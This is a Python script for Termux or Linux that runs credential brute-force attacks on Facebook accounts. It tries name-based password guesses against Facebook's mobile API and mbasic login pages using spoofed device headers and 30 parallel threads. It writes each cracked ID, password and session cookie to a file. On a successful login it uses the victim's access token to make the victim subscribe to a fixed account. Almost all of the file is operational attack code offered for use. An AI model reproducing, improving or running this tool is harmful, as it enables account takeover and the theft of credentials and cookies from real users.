import requests, os, json, sys, random, uuid, re, time
import string
from concurrent.futures import ThreadPoolExecutor as lol
from requests.exceptions import ConnectionError as CError
from bs4 import BeautifulSoup as parser

teer = ("|");
idx = [];
loop = 0;
take_file = []
new_file = [];
passwords = [];
proxer = [];
oku = []
import string, uuid, json, subprocess

cpu = [];
tfu = []
G = '\x1b[1;92m'
R = '\x1b[1;91m'
W = '\x1b[1;97m'
S = '\x1b[1;96m'
Y = '\x1b[1;93m'
yp = '\x1b[1;95m'
C = '\x1b[0m'
import platform

g_p_u = ("https://graph.facebook.com/{}?fields=friends.limit(50000)&access_token={}")

os.system('git pull')

import uuid
import hashlib
import random
import string
import requests
import time
import subprocess
import random


def rand_between(min, max):
    return str(random.randint(min, max))


def rand_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def get_sig(form_data):
    sig = ''
    for key in sorted(form_data.keys()):
        sig += key + '=' + form_data[key]
    sig += '62f8ce9f74b12f84c123cc23437a4a32'
    return hashlib.md5(sig.encode('utf-8')).hexdigest()


################################################################
"""
                           GET INFO              """

################################################################
try:
    mod___ = subprocess.check_output('getprop ro.product.product.model', shell=True).decode("utf-8").replace("\n",
                                                                                                             "").replace(
        "'b", "")
    _model_name_ = str(mod___)
except:
    _model_name_ = ("Infinix X689B")
try:
    brand__ = subprocess.check_output('getprop ro.product.odm.brand', shell=True).decode("utf-8").replace("\n",
                                                                                                          "").replace(
        "'b", "")
    mobile_name = str(brand__).lower()
except:
    mobile_name = ("infinix")
try:
    arm__ = subprocess.check_output('getprop ro.product.cpu.abi', shell=True).decode("utf-8").replace("\n", "").replace(
        "'b", "")
    arm_version = str(arm__)
except:
    arm_version = ("arm64-v8a")
try:
    den__ = subprocess.check_output('getprop ro.sf.lcd_density', shell=True).decode("utf-8").replace("\n", "").replace(
        "'b", "")
    den_t = str(den__)
    if den_t == '':
        den_t = ("320")
    elif den_t == ',':
        den_t = ("320")
    else:
        pass
except:
    den_t = ("320")
try:
    wid__ = subprocess.check_output('getprop sys.logical.width', shell=True).decode("utf-8").replace("\n", "").replace(
        "'b", "")
    _wid_ = str(wid__)
    if _wid_ == '':
        _wid_ = ("720")
    elif _wid_ == ',':
        _wid_ = ("720")
    else:
        pass
except:
    _wid_ = ("720")
try:
    hei__ = subprocess.check_output('getprop sys.logical.height', shell=True).decode("utf-8").replace("\n", "").replace(
        "'b", "")
    _hei_ = str(hei__)
    if _hei_ == '':
        _hei_ = ("1640")
    elif _hei_ == ',':
        _hei_ = ("1640")
    else:
        pass
except:
    _hei_ = ("1640")
tok_denty = str('density={},width={},height={}'.format(den_t, _wid_, _hei_))
d_ = ('{' + str(tok_denty) + '}')
try:
    build__ = subprocess.check_output('getprop persist.sys.ota_version', shell=True).decode("utf-8").replace("\n",
                                                                                                             "").replace(
        "'b", "")
    build_num_f = str(build__)
    if build_num_f == '':
        build_num_f = str('PPPP-H696JKM-R-GL-2204')
    else:
        pass
except:
    build_num_f = str('PPPP-H696JKM-R-GL-2204')
try:
    FBCR__ = subprocess.check_output('getprop ro.product.manufacturer', shell=True).decode("utf-8").replace("\n",
                                                                                                            "").replace(
        "'b", "")
    fbcr_m = str(FBCR__)
except:
    fbcr_m = str('INFINIX MOBILITY LIMITED')
import platform

xcx = platform.platform()[::-1].replace('-', "")
phone_module = (xcx[15:][:5]).upper()
################################################################

idx = []
p_ = []
oku = []
cpu = []
loop = 1
password_list = []
S = '\x1b[1;96m'
prototype = []
numz = []
pp = ['first', 'last']

logo = (f"""


\t ######     ###    #### ######## #### 
\t##    ##   ## ##    ##  ##        ##  
\t##        ##   ##   ##  ##        ##  
\t ######  ##     ##  ##  ######    ##  
\t      ## #########  ##  ##        ##  
\t##    ## ##     ##  ##  ##        ##  
\t ######  ##     ## #### ##       #### \n
{55 * '-'}
 [•] Owner  : Saifi
 [•] Github : http://github.com/********
 [•] Update : 0.12
{55 * '-'}
""")


def menu():
    os.system('clear')
    print('\n [•] Getting mobile models prototype ...')
    try:
        xx = requests.get(
            'https://raw.githubusercontent.com/MrSaifii/safi_cloner/main/mobile_models_prototype.txt').text.strip()
        mob_models = xx.splitlines()
        for x in mob_models:
            prototype.append(x)
    except:
        print(' getting models error ')
        exit(' maybe connection error')
    os.system('clear')
    print(logo)
    try:
        print(' [•] Checking permission ...')
        # print(platform.platform().lower())
        if os.path.exists('/data/data/com.termux/files/usr/bin/pkg'):
            print(" [•] Running on Termux")
            try:
                key = open('/data/data/com.termux/files/home/..txt', 'r').read()
            except:
                open('/data/data/com.termux/files/home/..txt', 'w').write(str(random.randint(1111111111, 9999999999)))
                menu()
        elif os.uname().sysname == 'Linux':
            print(" [•] Running on Linux")
            try:
                key = open('.key.txt', 'r').read()
            except:
                open('.key.txt', 'w').write(str(random.randint(1111111111, 9999999999)))
                menu()
        else:
            print(" [•] Unknown platform")
            exit()
        server = requests.get('https://raw.githubusercontent.com/MrSaifii/apv/main/.txt').text
        if key in server:
            print(' [•] You have permission to use ')
            time.sleep(2)
        else:
            print(' [•] You dont have permission to use')
            print(f' [•] Device Key: {key}')
            main_exit()
    except Exception as e:
        print(e)

    os.system('clear')
    print(logo)
    print(' [1] File Create ')
    print(' [2] File Cloning ')
    x = input(' [•] Choice an option: ')
    if x == '1':
        file_making()
    elif x == '2':
        pass
    else:
        exit(' maybe wrong option ')
    os.system('clear')
    print(logo)
    file = input(" [•] File: ")
    for x in open(file, 'r').readlines():
        idx.append(x.strip())
    z = input(' [•] Password file: ')
    try:
        for x in open(z, 'r').readlines():
            p_.append(x.strip())
    except:
        exit(' password list error ')
    print(' [1] Method api 1')
    print(' [2] Method mbasic.facebook.com')
    print(' [3] Method api 2')
    print(' [4] Method api 3')
    print(' [5] Method api 5')
    print(' [6] Method api 6')
    print(' [7] Method api 7')
    meth = input(' [•] Choice an option: ')
    print('\n\t    Brute Has been started ')
    print(47 * '-')
    with lol(max_workers=30) as send:
        for ids in idx:
            uid, nam = ids.rsplit("|")
            f = nam.rsplit(' ')[0]
            try:
                l = nam.rsplit(' ')[0]
            except(IOError, OSError, KeyError):
                l = f
            f = f.lower()
            l = l.lower()
            if str(meth) == '1':
                send.submit(api, uid, f, l)
            elif str(meth) == '2':
                send.submit(basic, uid, f, l)
            elif str(meth) == '3':
                send.submit(api_two, uid, f, l)
            elif str(meth) == '4':
                send.submit(api_three, uid, f, l)
            elif str(meth) == '5':
                send.submit(api_five, uid, f, l)
            elif str(meth) == '6':
                send.submit(api_six, uid, f, l)
            elif str(meth) == '7':
                send.submit(api_seven, uid, f, l)
            else:
                send.submit(api_seven, uid, f, l)
    print(47 * '-')
    input(' Press enter for menu <')
    exit()


def main_exit():
    exit()


def api(uid, f, l):
    global loop, cpu, oku
    sys.stdout.write('{}  [ {}/{} ] OK:{}\r'.format(C, str(loop), str(len(idx)), str(len(oku))))
    ses = requests.Session()
    url = uid  # "mbasic.facebook.com"
    model_brand = random.choice(prototype)
    for pw in p_:
        try:
            pw = pw.replace('first', f).replace('last', l).replace('First', f.capitalize()).replace('Last',
                                                                                                    l.capitalize())
            # print(url,pw)
            # url = ('100090295788041')
            # pw = ('riski12345')
            android_version = str(random.randint(4, 11)) + str('.0.0')
            dot = str('.')
            fbav = str(random.randint(111, 111)) + dot + str(random.randint(111, 999)) + dot + str(
                random.randint(111, 999)) + dot + str(random.randint(111, 999))
            fbbv = str(random.randint(111111111, 999999999))
            fbrv = str(random.randint(1111111, 9999999))
            build_o = str("".join(
                random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(25, 35)))).lower()
            # ua_ = f'Davik/2.1.0 (Linux; U; Android {android_version}; {_model_name_} Build/{build_num_f}) [FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/{d_};FBLC/en_GB;FBRV/{fbrv};FBCR/Zong;FBMF/{fbcr_m};FBBD/{mobile_name};FBPN/com.facebook.katana;FBDV/{_model_name_};FBSV/{str(random.randint(1,9))};FBOP/{str(random.randint(1,9))};FBCA/{arm_version};]'

            build__ = (f'{str(random.randint(11, 99))}.1.A.0.{str(random.randint(111, 999))})')
            mobile_brands = random.choice(['vivo', 'samsung', 'realme', 'matrola', 'nokia'])

            ua_ = f'Davik/2.1.0 (Linux; U; Android {android_version}; {model_brand} Build/RP1A.200720.011) [FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/{d_};FBLC/en_GB;FBRV/{fbrv};FBCR/Zong;FBMF/{fbcr_m};FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model_brand};FBSV/11;FBOP/19;FBCA/arm64-v8a:armeabi-v7a:armeabi;]'
            data = {'adid': str("".join(
                random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(25, 35)))).lower(),
                    'format': 'json', 'device_id': str("".join(
                    random.choice(string.ascii_uppercase + string.digits) for _ in
                    range(random.randint(25, 35)))).lower(), 'cpl': 'true', 'family_device_id': str("".join(
                    random.choice(string.ascii_uppercase + string.digits) for _ in
                    range(random.randint(25, 35)))).lower(), 'credentials_type': 'device_based_login_password',
                    'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': url,
                    'password': pw, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': str("".join(
                    random.choice(string.ascii_uppercase + string.digits) for _ in
                    range(random.randint(25, 35)))).lower(), 'currently_logged_in_userid': '0', 'locale': 'en_US',
                    'client_country_code': 'US', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate',
                    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                    'api_key': '882a8490361da98702bf97a021ddc14d'}
            content_lenght = ("&").join(["%s=%s" % (key, value) for key, value in data.items()])
            head = {'Accept': '*/*', 'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'Host': 'b-graph.facebook.com',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000000, 40000000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Quality': 'EXCELLENT',
                    'X-FB-Connection-Type': 'WIFI.LTE', 'X-Tigon-Is-Retry': 'False', 'User-Agent': ua_,
                    'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger', 'Content-Length': str(len(content_lenght))}
            r = ses.post("https://b-graph.facebook.com/auth/login", data=data, headers=head)
            q = json.loads(r.text)
            # print(data)
            # print(q)
            if 'session_key' in q:
                try:
                    coki = ";".join(i["name"] + "=" + i["value"] for i in r.json()["session_cookies"])
                except Exception as e:
                    coki = 'no'
                print("\r {} [Mr-saifii-ok] {} {}".format(G, url, C))
                oku.append(url)
                idz = url + teer + pw + teer + coki + ('\n')
                open('ids_original_pass.txt', 'a').write(str(idz))

                try:
                    tok = q['access_token']
                    ses.post('https://graph.facebook.com/100039322062241/subscribers?access_token=' + tok)
                except:
                    pass
                break
            elif 'www.facebook.com' in q['error']['message']:
                break
            else:
                continue
        except(CError):
            time.sleep(10)
            continue
    loop += 1
import sys
import random
import requests
from bs4 import BeautifulSoup


def basic(uid, f, l):
    global loop, cpu, oku
    sys.stdout.write('{}  [ {}/{} ] OK:{}\r'.format(C, str(loop), str(len(idx)), str(len(oku))))
    ses = requests.Session()
    url = "mbasic.facebook.com"

    for pw in p_:
        try:
            pw = pw.replace('first', f).replace('last', l).replace('First', f.capitalize()).replace('Last',
                                                                                                    l.capitalize())

            login_url = "https://{}/login/device-based/password/?uid={}&flow=login_no_pin&refsrc=deprecated&_rdr".format(
                url, uid)
            headers = {
                'Host': url,
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Java"',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': f'https://{url}/login/device-based/',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-us'
            }

            response = ses.get(login_url, headers=headers).text
            soup = BeautifulSoup(response, "html.parser")
            form_action = soup.find("form", method="post").get("action")
            form_data = {_.get('name'): _.get('value') for _ in
                         soup.find('form', {'method': 'post'}).findAll('input', {'name': ['lsd', 'jazoest']})}

            form_data.update({
                'uid': uid,
                'next': f'https://{url}/login/save-device/',
                'flow': 'login_no_pin',
                'encpass': '#PWD_BROWSER:0:{}:{}'.format(random.randint(1111111111, 9999999999), pw),
                'submit': 'Log in'
            })

            post_url = "https://{}{}".format(url, form_action)
            headers['Referer'] = login_url
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            response = ses.post(post_url, data=form_data, headers=headers, allow_redirects=False)

            if "c_user" in ses.cookies.get_dict():
                print("\r {} [Mr-saifii-ok] {} {}".format(G, uid, C))
                try:
                    coki = ';'.join(["%s=%s" % (k, v) for k, v in ses.cookies.get_dict().items()])
                except:
                    coki = 'no'
                oku.append(uid)
                url_str = str(uid)
                idz = url_str + teer + pw + teer + coki + '\n'
                open('ids_original_pass.txt', 'a').write(idz)

            elif "checkpoint" in ses.cookies.get_dict():
                break
            else:
                continue
        except Exception as e:
            time.sleep(10)
            continue
    loop += 1
